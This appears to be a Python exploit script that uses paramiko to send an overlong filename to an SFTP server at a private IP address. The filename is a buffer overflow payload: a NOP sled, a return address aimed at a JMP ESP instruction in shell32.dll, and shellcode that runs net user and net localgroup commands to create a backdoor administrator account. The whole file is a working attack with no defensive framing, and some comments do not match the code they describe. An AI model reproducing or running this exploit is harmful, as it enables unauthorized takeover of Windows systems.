import paramiko
import sys      

t_ip = "192.168.1.104"                  #target IP
t_port = 4019                                   #target port
password = "asdf"                               #Known user
username = "asdf"                               #password for user

transport = paramiko.Transport((t_ip, t_port))
transport.connect(username = username, password = password)
sftp = paramiko.SFTPClient.from_transport(transport)

sftp.chdir("./")                                #Execute a good command
buff_pen = "\x90" * 389
buff_pen += "\x65\x82\xa5\x7c"  #Point EIP to JMP ESP command in shell32.dll
buff_pen += "\x90" * 3
buff_pen +=
"\xeb\x13\x5b\x31\xc0\x50\x53\xbb\x4d\x11\x86\x7c\xff\xd3\xbb\xa2\xca\x81\x7c\xff\xd3\xe8\xe8\xff\xff\xff\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x42\x69\x6c\x6c\x79\x62\x6f\x79\x20\x77\x6f\x6f\x74\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x2f\x41\x44\x44\x20\x45\x78\x70\x41\x64\x6d\x69\x6e\x00"
 #Shellcode to make a new admin, billyboy, with a password of 'woot'
buff_pen += "\x90" * 3
buff_pen += "\xcc" * (800 - len(buff_pen))
sftp.get(buff_pen)